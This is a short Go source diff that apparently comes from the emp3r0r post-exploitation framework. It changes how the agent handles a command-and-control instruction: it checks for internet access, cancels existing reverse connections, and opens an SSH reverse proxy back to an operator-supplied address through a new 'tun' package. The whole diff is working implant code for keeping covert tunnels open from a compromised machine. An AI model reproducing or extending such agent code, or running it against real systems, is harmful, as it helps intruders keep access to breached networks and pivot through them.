@@ -11,6 +11,7 @@ import (
 	"strconv"
 	"strings"
 
+	"github.com/jm33-m0/emp3r0r/core/lib/tun"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 )
 
@@ -156,8 +157,20 @@ func processCCData(data *MsgTunData) {
 			}
 			addr := cmdSlice[1]
 			out = "Reverse proxy for " + addr + " finished"
+
+			hasInternet := tun.HasInternetAccess()
+			isProxyOK := tun.IsProxyOK(AgentProxy)
+			if !hasInternet && !isProxyOK {
+				out = "We dont have any internet to share"
+			}
+			for p, cancelfunc := range ReverseConns {
+				if addr == p {
+					cancelfunc() // cancel existing connection
+				}
+			}
+			addr += ":" + ReverseProxyPort
 			ctx, cancel := context.WithCancel(context.Background())
-			if err = SSHProxyClient(addr, ctx, cancel); err != nil {
+			if err = tun.SSHProxyClient(addr, &ReverseConns, ctx, cancel); err != nil {
 				out = err.Error()
 			}
 			data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, out)
